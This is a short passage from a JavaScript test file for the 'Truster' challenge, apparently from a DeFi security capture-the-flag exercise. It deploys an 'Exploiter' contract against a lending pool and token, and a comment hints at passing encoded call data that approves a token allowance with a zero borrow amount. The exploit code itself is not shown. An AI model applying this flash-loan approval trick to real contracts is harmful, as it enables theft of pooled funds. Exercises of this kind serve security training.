...
describe("[Challenge] Truster", function () {
  ...
  it("Exploit", async function () {
    ...
    const Exploiter = await ethers.getContractFactory("Exploiter", deployer);
    this.exploiter = await Exploiter.deploy(
      this.pool.address,
      this.token.address
    );
    //exploit bytes call data to approve allowace. PS: borrow amount should be 0
